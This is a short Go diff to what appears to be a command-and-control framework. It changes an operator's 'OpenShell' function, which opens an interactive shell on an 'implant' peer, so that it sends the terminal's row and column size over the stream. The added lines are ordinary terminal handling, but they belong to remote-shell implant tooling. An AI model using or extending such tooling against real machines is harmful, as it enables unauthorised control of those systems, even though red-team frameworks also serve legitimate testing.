@@ -2,6 +2,7 @@ package core
 
 import (
 	"context"
+	"encoding/binary"
 	"fmt"
 	"io"
 	"log"
@@ -385,6 +386,17 @@ func (o *Operator) OpenShell(implantPeerID string) error {
 		return fmt.Errorf("open shell stream to %s: %w", implantPeerID, err)
 	}
 	defer s.Close()
+
+	rows, cols, err := term.GetSize(int(os.Stdin.Fd()))
+	if err != nil {
+		rows, cols = 30, 120
+	}
+	if err := binary.Write(s, binary.LittleEndian, uint16(rows)); err != nil {
+		return fmt.Errorf("send rows: %w", err)
+	}
+	if err := binary.Write(s, binary.LittleEndian, uint16(cols)); err != nil {
+		return fmt.Errorf("send cols: %w", err)
+	}
 
 	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
